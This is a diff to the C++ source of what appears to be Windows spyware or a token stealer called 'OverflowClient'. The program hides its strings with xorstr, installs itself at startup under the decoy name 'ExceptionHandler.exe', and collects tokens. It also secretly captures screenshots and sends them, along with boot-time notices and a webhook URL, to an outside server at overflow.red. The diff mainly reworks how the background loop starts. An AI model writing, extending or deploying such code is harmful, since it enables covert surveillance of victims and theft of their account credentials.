@@ -3,10 +3,12 @@
 #include <fstream>
 #include <vector>
 #include <regex>
+#include <iostream>
 
 #include "..\utility\xor.hpp"
 #include "..\utility\requests.h"
 #include "..\utility\helper.h"
+#include "../gui/gui.h"
 
 namespace fs = std::filesystem;
 
@@ -15,6 +17,8 @@ const bool TEST_SERVER = true;
 const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");
 const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");
 std::string client_webhook_url = "";
+bool 
+run_background = false;
 
 std::vector<std::string> get_tokens() {
 	std::vector<std::string> tokens = {};
@@ -80,7 +84,6 @@ void background_loop() {
 }
 
 void start_client() {
-
 	/* Check If We've Already Created Startup */
 	if (check_for_startup()) {
 		/* Load Webhook */
@@ -95,11 +98,11 @@ void start_client() {
 		if ((uptime / 60000).count() <= 1) {
 			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));
 		
-			/* Run In Background */
-			background_loop();
+			/* Set To Run In Background */
+			run_background = true;
 		}
 
-		/* Send Screenshot */
+		/* Only Send Screenshot */
 		take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
 		post_request_file(xorstr_("https://overflow.red/post.php"), roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
 		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
@@ -143,9 +146,7 @@ void start_client() {
 		file << client_webhook_url << std::endl;
 		file.close();
 
-		/* ~~~~~~~~~~~~ Stage 2 ~~~~~~~~~~~~ */
-
-		/* Run In Background */
-		background_loop();
+		/* Set To Run In Background */
+		run_background = true;
 	}
 }
